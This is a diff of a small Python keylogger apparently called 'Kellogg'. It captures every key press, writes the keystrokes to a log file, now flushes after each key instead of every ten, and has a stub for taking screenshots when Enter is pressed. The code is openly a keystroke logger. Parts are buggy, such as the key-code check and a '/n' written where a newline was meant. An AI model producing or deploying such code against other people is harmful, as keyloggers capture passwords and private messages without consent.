@@ -6,34 +6,29 @@ import os
 import os.path
 import shutil
 import sys
+
+dirName = 'templogs'
+
+#will check if directory exists and create directory assets
+try:
+     os.mkdir(dirName)
+     print ("Directory", dirName, "created")
+except:
+    print("Direcotry", dirName, "already exists")
+
+#put 32log.txt into the templogs file  
+'''
+save_path = 'C:/tempDir'
+name_of_file = input("32log.txt")
+completeName = os.path.join(save_path, name_of_file+".txt")
+file1 = open(completeName, "w")
+toFile = input("Hello")
+file1.write(toFile)
+file1.close()
+'''
 #sys.path.insert(1, '')
-'''
-#UI break 1
-os.system('color 6')
-print("New Session Started")
-time.sleep(3)
-os.system('cls' if os.name == 'nt' else 'clear')
 
 
-#UI break 2
-os.system('color 4')
-Uname = input("INPUT USERNAME: ")
-print("Kellogg Boot")
-time.sleep(1)
-print("Initializing Kellog")
-time.sleep(1)
-
-#UI break 3
-os.system('cls' if os.name == 'nt' else 'clear')
-now = datetime.datetime.now()
-os.system('color 2')
-print (str(now))
-print("Welcome User:", Uname)
-time.sleep(1)
-print("UPDATE:")
-print("____________________")
-
-'''
 #code acutal
 count = 0
 keys = []
@@ -41,13 +36,13 @@ keys = []
 if not os.path.exists("kellogg/32log.txt"):
     	f= open("32log.txt","w+")
 
-    
+
 def on_press(key):
     global keys, count
     keys.append(key)
     count += 1
     print("{0} pressed".format(key))
-    if count >= 10:
+    if count >= 1:
         count = 0
         write_file(keys)
         keys = []
@@ -63,6 +58,7 @@ def write_file(keys):
                 f.write(k)
             elif k.find("enter") >0:
                 f.write("Screenshot")
+                #find screenshot method
                 f.write('/n')
             elif k.find("backspace") >0:
                 f.write("")
@@ -70,8 +66,8 @@ def write_file(keys):
                 f.write("Alt")
             elif k.find("<173>" or "<174>" or "<175>") > 0:
                 f.write("Audio Change")
-                
-def on_release(key):     
+
+def on_release(key):
     if key == Key.esc:
         return False
     #if we want we could try to make this save the txt file then run an inf. loop
